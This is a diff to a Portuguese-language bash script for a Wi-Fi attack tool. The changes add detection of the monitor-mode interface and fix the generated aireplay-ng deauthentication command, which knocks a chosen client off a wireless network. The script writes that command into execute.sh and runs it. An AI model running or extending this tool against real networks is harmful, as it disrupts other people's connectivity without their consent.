@@ -7,6 +7,7 @@
 	color_yellow="\033[01;33m"
 	color_white="\033[01;37m"
 	card_name="wlan0"
+	card_mon="mon0"
 # =============[ VARIAVEIS ]============= 
 function print_logo(){
         echo -e "\033[01;32m"       
@@ -117,6 +118,24 @@ function get_routermac(){
 	echo -e "$color_yellow [...] Obtendo mac do roteador"
 	router_mac=$(iwconfig $card_name| grep Access | sed -e 's/Mode.*nt://g' | grep : | sed -e 's/ //g')
 	echo -e "$color_green [!] GATEWAY MAC:$color_white { $router_mac }"
+}
+function check_interface(){
+	if [ $(iwconfig | grep -c "${cardname}mon") -lt 1 ]
+		then
+			if [ $(iwconfig | grep -c "mon0") -lt 1 ]
+				then
+					echo -e "$color_yellow [?] Não foi possivel identificar a interface de monitoramento, Qual usar ? (Ex's: wlanXmon / monX / Xmon )"
+					read mon_interface
+					card_mon=$mon_interface
+					echo -e "$color_green [!] Será utilizado a interface $card_mon como monitoramento !"
+			else
+				card_mon="mon0"
+				echo -e "$color_green [!] A placa de monitoramento foi definida para { $card_mon }"
+			fi
+	else
+			card_mon="${card_name}mon"
+			echo -e "$color_green [!] A placa de monitoramento foi definida para { $card_mon }"
+	fi
 }
 function load_clients(){
 	echo -e "$color_yellow [...] Pesquisando clientes na rede $lip"
@@ -279,9 +298,10 @@ function stop(){
 	echo -e "$color_white [!] Versão:$color_green $version"
 	ping 127.0.0.1 -c 5 > dumps.txt
 	clear	
-	rm readmacs.txt interfaces.txt clients_ips.txt scan_out.txt clients.txt core-depends.logs > dumps.txt
+	rm readmacs.txt clients_ips.txt scan_out.txt clients.txt core-depends.logs > dumps.txt
 	if [ -e "execute.sh" ] ; then rm execute.sh > dumps.txt; fi
 	if [ -e "up_interfaces.txt" ] ; then rm up_interfaces.txt > dumps.txt; fi
+	if [ -e "interfaces.txt" ] ; then rm interfaces.txt > dumps.txt; fi
 	rm dumps.txt
 	exit
 }
@@ -390,8 +410,9 @@ $color_green   0~$y)$color_white Expulsar cliente escolhido"
 			ping 127.0.0.1 -c 3 > dumps.txt
 			echo -e " [!] -> Para parar o ataque pressione CTRL-C!"
 			echo -e ""
+			check_interface
 			ping -c 3 127.0.0.1 > dumps.txt
-			echo -e "echo -e '\033[01;31m'\naireplay-ng -0 5000 -a $router_mac -c $mac "$card_name"mon" >> execute.sh
+			echo -e "echo -e '\033[01;31m'\naireplay-ng -0 5000 -a $router_mac -c $mac $card_mon">> execute.sh
 			chmod +x execute.sh > dumps.txt
 			gnome-terminal -- "./execute.sh" > dumps.txt
 			show_macs
